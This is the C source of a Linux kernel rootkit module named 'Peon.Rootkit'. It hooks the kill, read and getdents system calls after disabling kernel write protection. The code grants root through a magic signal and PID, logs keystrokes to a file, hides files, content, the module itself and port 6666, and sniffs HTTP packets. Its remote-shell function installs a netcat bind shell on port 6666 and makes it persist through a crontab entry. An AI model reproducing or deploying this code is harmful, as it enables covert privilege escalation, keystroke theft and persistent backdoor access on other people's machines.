#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/cred.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/file.h>
#include <linux/sched.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <linux/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/export.h>
#include <linux/fs.h>
#include <linux/list.h>
#include <linux/cdev.h>
#include <linux/termios.h>
#include <linux/device.h>
#include <linux/tty_ldisc.h>
#include <linux/tty_driver.h>
#include <linux/tty.h>
#include <linux/types.h>
#include <linux/socket.h>
#include <linux/inet.h>
#include <linux/limits.h>
#include <linux/proc_fs.h>
#include <linux/mutex.h>
#include <linux/fs.h>
#include <linux/buffer_head.h>
#include <asm/processor.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include <asm/errno.h>
#include <asm/io.h>
#include <asm/segment.h>
#include <net/tcp.h>

/* define what you want*/
#define ROOTACCESS
//#define HIDEMODULE
//#define KEYLOGGER
#define HIDECONTENT
//#define HIDEFILE
//#define REMOTESHELL
//#define NETWORK_HTTP
//#define HIDE_COMM

#define SECRETPROCESS "_root_"
#define SECRETLINE "--ROOT--"
#define SECRETFILE "_root_"

#define DEBUG //print

/* Signal & PID 4 obtain root access */
#define SIG_4_ROOT 9
#define PID_4_ROOT 88888

/* Signal & PID 4 Show module */
#define SIG_4_SHOW_MOD 9
#define PID_4_SHOW_MOD 22222

/* file path  */
#define KEYLOG_PATH "/tmp/keylogger.txt"
#define NET_PATH "/tmp/test.txt"

/*hide hacker port*/
#define PORT_TO_HIDE 6666



#if defined(KEYLOGGER) || defined(HIDECONTENT)
#define HOOK_READ
#endif

#if defined(ROOTACCESS) || defined(HIDEMODULE)
#define HOOK_KILL
#endif

/*from net/ipv4/tcp_ipv4.c*/
#define TMPSZ 150
#define ETH_P_ALL 0x0003

#if defined(__LP64__) || defined(_LP64) //__x86_64 /* 64 bits machine */
#define OS_64_BITS
#define KERN_MEM_BEGIN 0xffffffff81000000
#define KERN_MEM_END 0xffffffff81e42000

#else /* 32 bits machine */
#define KERN_MEM_BEGIN 0xc0000000 //11000000 00000000 00000000 00000000
#define KERN_MEM_END 0xd0000000 //11010000 00000000 00000000 00000000
#endif

struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[1];
};

/* saved file offset needed for append_filez func*/
unsigned long long file_saved_offset = 0;

char *strnstr(const char *haystack, const char *needle, size_t n) {
    char *s = strstr(haystack, needle);
    if (s == NULL)
        return NULL;
    if (s - haystack + strlen(needle) <= n)
        return s;
    else
        return NULL;
}

#ifdef HIDEPROCESS

/*
 * process hiding functions
 */
struct task_struct *get_task(pid_t pid) {
    struct task_struct *p = current;
    do {
        if (p->pid == pid)
            return p;
        p = (struct task_struct *) p->tasks.next;
    } while (p != current);
    return NULL;

}

/* the following function comes from fs/proc/array.c */
static inline char *task_name(struct task_struct *p, char *buf) {
    int i;
    char *name;

    name = p->comm;
    i = sizeof (p->comm);

    return buf + 1;
}

int invisible(pid_t pid) {
    struct task_struct *task = get_task(pid);
    char *buffer;
    if (task) {
        buffer = kmalloc(200, GFP_KERNEL);
        memset(buffer, 0, 200);
        task_name(task, buffer);
        if (strstr(buffer, SECRETPROCESS)) {
            kfree(buffer);
            return 1;
        }
    }
    return 0;
}
#endif

struct file* file_open(const char* path, int flags, int rights) {
    struct file* filp = NULL;
    mm_segment_t oldfs;
    int err = 0;

    oldfs = get_fs();
    set_fs(get_ds());
    filp = filp_open(path, flags, rights);
    set_fs(oldfs);
    if (IS_ERR(filp)) {
        err = PTR_ERR(filp);
        return NULL;
    }
    return filp;
}

void file_close(struct file* file) {
    filp_close(file, NULL);
}

/*
 *function read data into file
 */
int file_read(struct file* file, unsigned long long offset, unsigned char* data, unsigned int size) {
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_read(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}

/*
 *function write data into file
 */
int file_write(struct file* file, unsigned long long offset, unsigned char* data, unsigned int size) {
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_write(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}

int file_sync(struct file* file) {
    vfs_fsync(file, 0);
    return 0;
}

/*
 *function append data into path_file and with size
 */
char append_filez(const char *path_file, unsigned char * data, unsigned int size) {
    struct file* fd = NULL;
    int error;
    fd = file_open(path_file, O_WRONLY | O_CREAT, 0644);
    if (fd == NULL)
        return -1;

    error = file_write(fd, file_saved_offset, data, size);
    //if(!error);

    file_saved_offset += size;
    file_close(fd);
    return 0;

}

unsigned long **find_syscall_table(void) {
    /* Find the syscall table
     * search in memory the adress of a function of the syscall table (sys_close)
     */
    unsigned long **sctable;
    unsigned long int i = KERN_MEM_BEGIN;

    while (i < KERN_MEM_END) {

        sctable = (unsigned long **) i;

        if (sctable[__NR_close] == (unsigned long *) sys_close) {

            return &sctable[0];

        }

        i += sizeof (void *);
    }

    return NULL;
}

void disable_wp(void) { //disable write protection

#if defined(OS_64_BITS)

    __asm__("push %rax\n\t"
            "mov %cr0,%rax;\n\t"
            "and $~(1 << 16),%rax;\n\t"
            "mov %rax,%cr0;\n\t"
            "wbinvd\n\t"
            "pop %rax"
            );
#else

    __asm__("push %eax\n\t"
            "mov %cr0,%eax;\n\t"
            "and $~(1 << 16),%eax;\n\t"
            "mov %eax,%cr0;\n\t"
            "wbinvd\n\t"
            "pop %eax"
            );
#endif
}

void enable_wp(void) { //enable write protection

#if defined(OS_64_BITS)

    __asm__("push %rax\n\t"
            "mov %cr0,%rax;\n\t"
            "or $(1 << 16),%rax;\n\t"
            "mov %rax,%cr0;\n\t"
            "wbinvd\n\t"
            "pop %rax"
            );

#else
    __asm__("push %eax\n\t"
            "mov %cr0,%eax;\n\t"
            "or $(1 << 16),%eax;\n\t"
            "mov %eax,%cr0;\n\t"
            "wbinvd\n\t"
            "pop %eax"
            );
#endif
}

/* Adress of the syscall table */
unsigned long ** syscall_table;

//flag: hide module
char FIRST_SHOW_MODULE = 1;



/* save packet type */
struct packet_type pt;

/* save module */
struct module *mod;


/*
Three byte keys:
#################

UpArrow: 0x1B 0x5B 0X41
DownArrow: 0x1B 0x5B 0X42
RightArrow: 0x1B 0x5B 0x43
LeftArrow: 0x1b 0x5B 0x44
 */



#ifdef KEYLOGGER

void check_keyboard_buf(char __user *buf) { //func parsing keycode send by sys_read
    u16 index = 0;
    int temp1, temp2;

    while (buf[index] != 0x00 && strlen(buf) == 1) {
        switch (buf[index]) {
            case 0x9:
            {
                printk(KERN_ALERT "Peon.Rootkit: keyboard = {TAB}\n");
                append_filez(KEYLOG_PATH, "{TAB}", 5);
                break;
            }
            case 0x7f:
            {
                printk(KERN_ALERT "Peon.Rootkit: keyboard = {BACKSPACE}\n");
                append_filez(KEYLOG_PATH, "{BACKSPACE}", 11);
                break;
            }
            case 0x0d:
            {
                printk(KERN_ALERT "Peon.Rootkit: keyboard = {ENTER}\n");
                append_filez(KEYLOG_PATH, "{ENTER}", 7);
                break;
            }
            case 0x0a:
            {
                printk(KERN_ALERT "Peon.Rootkit: keyboard = {NewLine}\n");
                append_filez(KEYLOG_PATH, "{NewLine}", 9);
                break;
            }
            case 0x1B:
            {
                temp1 = 1;
                break;
            }
            case 0x5B:
            {
                if (temp1 == 1)
                    temp2 = 1;
                break;
            }
            case 0X41:
            {
                if (temp1 == 1 && temp2 == 1)
                    printk(KERN_ALERT "Peon.Rootkit: keyboard = {UpArrow}\n");
                append_filez(KEYLOG_PATH, "{UpArrow}", 7);
                break;
            }
            case 0X42:
            {
                if (temp1 == 1 && temp2 == 1)
                    printk(KERN_ALERT "Peon.Rootkit: keyboard = {DownArrow}\n");
                append_filez(KEYLOG_PATH, "{DownArrow}", 9);
                break;
            }
            case 0X43:
            {
                if (temp1 == 1 && temp2 == 1)
                    printk(KERN_ALERT "Peon.Rootkit: keyboard = {RightArrow}\n");
                append_filez(KEYLOG_PATH, "{RightArrow}", 11);
                break;
            }
            case 0X44:
            {
                if (temp1 == 1 && temp2 == 1)
                    printk(KERN_ALERT "Peon.Rootkit: keyboard = {LeftArrow}\n");
                append_filez(KEYLOG_PATH, "{LeftArrow}", 10);
                break;
            }

            default:
            {
                printk(KERN_ALERT "Peon.Rootkit: keyboard[%d] = %c, %02X\n", index, buf[index], buf[index]);
                append_filez(KEYLOG_PATH, &buf[index], 1);
                break;
            }
        }
        index++;
    }

}
#endif

#ifdef HOOK_READ
asmlinkage long (*orig_read_call) (unsigned int fd, char __user *buf, size_t count); //original sys_read call

asmlinkage long hook_read_call(unsigned int fd, char __user *buf, size_t count) { //hooked sys_read call

    long ret = orig_read_call(fd, buf, count); // call original sys_read 


    if (ret < 0)return ret;

#ifdef KEYLOGGER
    /*
     *read from fd =0 coresponding to stdin
     */
    if (fd == 0) {
        check_keyboard_buf(buf);
    }
#endif

#ifdef HIDECONTENT
    /*
     *hide content between  2 SECRETLINE markup
     */

    if ((fd < 50) && (fd > 2)) {
        char *kbuf = NULL, *ch = NULL, *ch2 = NULL;
        long modif_ret = 0;
        kbuf = (char*) kmalloc(ret + 1, GFP_KERNEL);

        if (kbuf == NULL) {
            return ret;
        }
        memset(kbuf, 0, ret + 1);
        copy_from_user(kbuf, buf, ret);

        ch = strstr(kbuf, SECRETLINE); // find first markup
        if (ch != NULL) {
            ch2 = strstr(ch + strlen(SECRETLINE) + 1, SECRETLINE); // find second markup
        }

        //if find it
        if (ch != NULL && ch2 != NULL) {
#ifdef DEBUG
            printk(KERN_ALERT "Peon.Rootkit: HIDECONTENT\n");
#endif
            modif_ret = strlen(ch) - strlen(ch2);
            memmove(ch, ch2 + strlen(SECRETLINE), strlen(ch2) - strlen(SECRETLINE) - 1); // copy over between markup pattern SECRETLINE 
            memset(ch + strlen(ch2) - 2, 0, ret + strlen(SECRETLINE)); //fill limit with 0
            copy_to_user(buf, kbuf, ret);
        }
        kfree(kbuf);
    }
#endif

    return ret;
}

#endif



#ifdef HIDEFILE
#if defined(OS_64_BITS)
/* -------------------------- 64 bits getdents version ------------------------------------------ */
asmlinkage long (*orig_getdents) (unsigned int fd, struct linux_dirent __user *dirent, unsigned int count); //original sys_getdents call

asmlinkage long hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) { //hoocked sys_getdents call

    int ret = orig_getdents(fd, dirent, count); // call original sys_getdents
    {

        unsigned long off = 0;
        struct linux_dirent __user *dir;

        /* list directory and hide files containing name _root_ */
        for (off = 0; off < ret;) {

            dir = (void*) dirent + off;

            /* find if filename contains SECRETLINE */
            if ((strstr(dir->d_name, SECRETFILE)) != NULL) {
#ifdef DEBUG
                printk(KERN_ALERT "Peon.Rootkit: hide.64 %s", dir->d_name);
#endif    	
                /* hide files containing name _root_ */
                ret -= dir->d_reclen;
                if (dir->d_reclen + off < ret)
                    memmove((void*) dir, (void*) ((void*) dir + dir->d_reclen), (size_t) (ret - off));
            } else
                off += dir->d_reclen;
        }
    }
    return ret;
}
#else

/* -------------------------- 32 bits getdents version ------------------------------------------ */
asmlinkage long (*orig_getdents64) (unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count); //original sys_getdents64 call

asmlinkage long hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count) { //hoocked sys_getdents64 call

    int ret = orig_getdents64(fd, dirent, count); // call original sys_getdents64
    {

        unsigned long off = 0;
        struct linux_dirent64 __user *dir;

        /* list directory and hide files containing name _root_ */
        for (off = 0; off < ret;) {

            dir = (void*) dirent + off;

            /* find if filename contains SECRETLINE */
            if ((strstr(dir->d_name, SECRETFILE)) != NULL) {
#ifdef DEBUG
                printk(KERN_ALERT "Peon.Rootkit: hide %s", dir->d_name);
#endif
                /* hide files containing name _root_ */
                ret -= dir->d_reclen;
                if (dir->d_reclen + off < ret)
                    memmove((void*) dir, (void*) ((void*) dir + dir->d_reclen), (size_t) (ret - off));
            } else
                off += dir->d_reclen;
        }
    }
    return ret;
}
#endif
#endif

#ifdef HOOK_KILL
asmlinkage long (*kill_orig_call) (pid_t pid, int sig); //original sys_kill call

asmlinkage long kill_hook_call(pid_t pid, int sig) { //hoocked sys_kill call

#ifdef ROOTACCESS
    /* Root access func*/
    if ((sig == SIG_4_ROOT) && (pid == PID_4_ROOT)) {
        struct task_struct *cur_task;
        struct cred *credz;

        cur_task = current;
        credz = cur_task->cred;
        credz->uid = 0;
        /*credz->gid=1337;
        credz->suid=0;
        credz->sgid=0;
        credz->euid=0;
        credz->egid=0; */
        cur_task->cred = credz;
#ifdef DEBUG
        printk(KERN_ALERT "Peon.Rootkit: [KILL -%d %d] shell root access", SIG_4_ROOT, PID_4_ROOT);
#endif
    }
#endif

#ifdef HIDEMODULE
    /* show hided module kill */
    if ((sig == SIG_4_SHOW_MOD) && (pid == PID_4_SHOW_MOD) && FIRST_SHOW_MODULE) {
        FIRST_SHOW_MODULE = 0; // only one try
        /* attach save module to the list of module by seaching snd module */
        list_add(&mod->list, &find_module("snd")->list);
#ifdef DEBUG    
        printk(KERN_ALERT "Peon.Rootkit: show module");
#endif
    }
#endif
    return kill_orig_call(pid, sig); // return original sys_kill func
}
#endif

/* -------------------------------------------------------------------- */


#ifdef NETWORK_HTTP

/*
 *func call by the net_device
 *expect  a TCP packet and form source port 80 or 8080
 * modify http packet you can modify it as you wish
 */
int dev_func(struct sk_buff *skb, struct net_device *dev, struct packet_type *pkt, struct net_device *dev2) {
    if (skb->pkt_type == PACKET_HOST) {
        struct iphdr *ip;
        ip = (struct iphdr*) skb_network_header(skb);
        if (ip->version == 4 && ip->protocol == IPPROTO_TCP) {
            struct tcphdr *tcp_hdr;
            unsigned char *data;
            //tcp_hdr=tcp_hdr(skb);
            tcp_hdr = (struct tcphdr *) (ip->ihl * 4 + skb->data);
            data = (unsigned char *) ((__u32 *) tcp_hdr + tcp_hdr->doff);
            /* check if source port is from http  or from proxy */
            if (tcp_hdr->source == ntohs(80) || tcp_hdr->source == ntohs(8080)) {
                char *tmp = NULL;
#ifdef DEBUG
                printk(KERN_ALERT "Peon.Rootkit: http\n");
                printk(KERN_ALERT "Peon.Rootkit: skb data len %d\n", skb->data_len);
                printk(KERN_ALERT "Peon.Rootkit: skb mac len %d\n", skb->mac_len);
                printk(KERN_ALERT "Peon.Rootkit: skb hdr len %d\n", skb->hdr_len);
                printk(KERN_ALERT "Peon.Rootkit: skb taille %d\n", (int) strlen(data));
                printk(KERN_ALERT "Peon.Rootkit: data=%s\n", data);
                append_filez(NET_PATH, data, strlen(data));
#endif
                /* modify http packet you can modify it as you wish */
                /* find "-----------------------------" pattern and replace each char by A */
                tmp = strstr(data, "-----------------------------");
                if (tmp != NULL) {
                    int i = 0;
                    for (; i < strlen("-----------------------------"); i++)
                        *(tmp + i) = 'A';
                }

            }

        }
    }
    kfree_skb(skb);
    return 0;
}
#endif

#ifdef HIDE_COMM

/* original tcp4_seq_show func */
int (*old_tcp4_seq_show)(struct seq_file*, void *) = NULL;

/* hoocked tcp4_seq_show func
 * hide PORT_TO_HIDE port
 */
int hacked_tcp4_seq_show(struct seq_file *seq, void *v) {
    int retval = old_tcp4_seq_show(seq, v);

    char port[12];

    sprintf(port, "%04X", PORT_TO_HIDE);

    if (strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ))
        seq->count -= TMPSZ;
    return retval;
}

/*
 * init func for hiding comm
 * attach the hooked tcp4_seq_show
 */
void init_hide_net(void) {

    struct tcp_seq_afinfo *my_afinfo = NULL;
    struct proc_dir_entry *my_dir_entry = init_net.proc_net->subdir;

    while (strcmp(my_dir_entry->name, "tcp")) //finc tcp conn.
        my_dir_entry = my_dir_entry->next; //go next

    if ((my_afinfo = (struct tcp_seq_afinfo*) my_dir_entry->data)) {
        old_tcp4_seq_show = my_afinfo->seq_ops.show; //save original call
        my_afinfo->seq_ops.show = hacked_tcp4_seq_show; //attach the hooked one
    }

}

/*
 * exit func for hiding comm
 * attach original tcp4_seq_show call
 */
void exit_hide_net(void) {
    struct tcp_seq_afinfo *my_afinfo = NULL;
    struct proc_dir_entry *my_dir_entry = init_net.proc_net->subdir;

    while (strcmp(my_dir_entry->name, "tcp")) //finc tcp conn.
        my_dir_entry = my_dir_entry->next; //go next

    if ((my_afinfo = (struct tcp_seq_afinfo*) my_dir_entry->data)) {
        my_afinfo->seq_ops.show = old_tcp4_seq_show; //attach original tcp4_seq_show call
    }
}
#endif

#ifdef REMOTESHELL

void remote_shell(void) {

    char *envp[] = {"HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", 0}; /*Environmement variable*/
    char *argv1[] = {"/bin/sh", "-c", "/usr/bin/apt-get -y remove netcat*", NULL};
    char *argv2[] = {"/bin/sh", "-c", "/usr/bin/apt-get -y install netcat", NULL};
    char *argv3[] = {"/bin/sh", "-c", "/bin/netcat -l -p 6666 -e /bin/sh &", NULL}; /*Command : use netcat to launch a shell on the port 1234*/
    char *argv4[] = {"/bin/sh", "-c", "echo \"* * * * * root /bin/netcat -l -p 6666 -e /bin/sh\" >> /etc/crontab", NULL};

    call_usermodehelper(argv1[0], argv1, envp, UMH_WAIT_PROC); /*Remove all netcat version*/
    call_usermodehelper(argv2[0], argv2, envp, UMH_WAIT_PROC); /*Install netcat-taditional*/
    call_usermodehelper(argv4[0], argv4, envp, UMH_WAIT_PROC); /*Add rule to crontab to launch netcat every minute*/

    allow_signal(SIGKILL);
#ifdef DEBUG
    printk(KERN_ALERT "ROOTKIT Remote Shell RUN\n");
#endif
    call_usermodehelper(argv3[0], argv3, envp, UMH_WAIT_PROC); //Launch netcat the fisrt time

    return;
}
#endif

int init_module(void) {

    syscall_table = find_syscall_table();

    if (syscall_table == 0) {
#ifdef DEBUG
        printk(KERN_INFO "Peon.Rootkit: System call table found!\n");
#endif
        return 1;
    }
#ifdef DEBUG
    printk(KERN_INFO "Peon.Rootkit: System call found at : 0x%lx\n", (unsigned long) syscall_table);
#endif

#ifdef HIDEMODULE
    /* hide module : lsmod */
    mod = THIS_MODULE; //save module
    list_del(&THIS_MODULE->list); //detach module form module list
    FIRST_SHOW_MODULE = 1;
#ifdef DEBUG
    printk(KERN_INFO "Peon.Rootkit is hidden\n");
#endif
#else
    FIRST_SHOW_MODULE = 0;
#ifdef DEBUG
    printk(KERN_INFO "Peon.Rootkit is un-hidden\n");
#endif
#endif

    disable_wp();

#ifdef HOOK_KILL
    /* Save the adress of the original kill syscall */
    kill_orig_call = (void *) syscall_table[__NR_kill];

    /* Replace the syscall in the table */
    syscall_table[__NR_kill] = (void*) kill_hook_call;
#endif

#ifdef HIDEFILE
#if defined(OS_64_BITS)

#ifdef DEBUG    
    printk(KERN_INFO "Peon.Rootkit: Hide Files 64 bits\n");
#endif
    /* Save the adress of the original getdents syscall */
    orig_getdents = (void *) syscall_table[__NR_getdents];

    /* Replace the syscall in the table */
    syscall_table[__NR_getdents] = (void*) hacked_getdents;


#else
#ifdef DEBUG
    printk(KERN_INFO "Peon.Rootkit: Hide Files 64 bits\n");
#endif
    /* Save the adress of the original getdents64 syscall */
    orig_getdents64 = (void *) syscall_table[__NR_getdents64];

    /* Replace the syscall in the table */
    syscall_table[__NR_getdents64] = (void*) hacked_getdents64;

#endif
#endif

#ifdef NETWORK_HTTP
    //remove interfacepacket layer2
    __dev_remove_pack(&pt);
    // stuff for network, call "dev_func" function
    pt.type = htons(ETH_P_ALL);
    pt.func = dev_func;
    dev_add_pack(&pt);
#ifdef DEBUG
    printk(KERN_INFO "Peon.Rootkit is loaded our Network device!\n");
#endif
#endif



#ifdef HOOK_READ
    /* Save the adress of the original read syscall */
    orig_read_call = (void *) syscall_table[__NR_read];

    /* Replace the syscall in the table */
    syscall_table[__NR_read] = (void*) hook_read_call;

#ifdef DEBUG
    printk(KERN_INFO "Peon.Rootkit: HooKeD Read!\n");
#endif
#endif

#ifdef HIDE_COMM
    /* init func for hiding comm */
    init_hide_net();
#endif

    enable_wp();


#ifdef REMOTESHELL
    /*Launch the remote shell*/
    remote_shell();
#endif

#ifdef DEBUG
    printk(KERN_INFO "Peon.Rootkit is loaded!\n");
#endif

    return 0;
}

void cleanup_module(void) {

    disable_wp();


#ifdef HIDE_COMM
    /* attack original tcp4_seq_show */
    exit_hide_net();
#endif



    /* Set the orignal calls*/

#ifdef HOOK_KILL
    syscall_table[__NR_kill ] = (void*) kill_orig_call;
#endif
#ifdef HOOK_READ
    syscall_table[ __NR_read ] = (void*) orig_read_call;
#endif


#ifdef HIDEFILE
#if defined(OS_64_BITS)
    syscall_table[ __NR_getdents] = (void*) orig_getdents;
#else
    syscall_table[ __NR_getdents64] = (void*) orig_getdents64;
#endif
#endif

#ifdef NETWORK_HTTP
    /* remove interfacepacket layer2 */
    __dev_remove_pack(&pt);

#ifdef DEBUG
    printk(KERN_INFO "Peon.Rootkit remove our Network device!\n");
#endif
#endif

    enable_wp();

#ifdef DEBUG
    printk(KERN_INFO "Peon.Rootkit is unloaded!\n");
#endif
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Peondusud");
MODULE_DESCRIPTION("peondusud rootkit module");
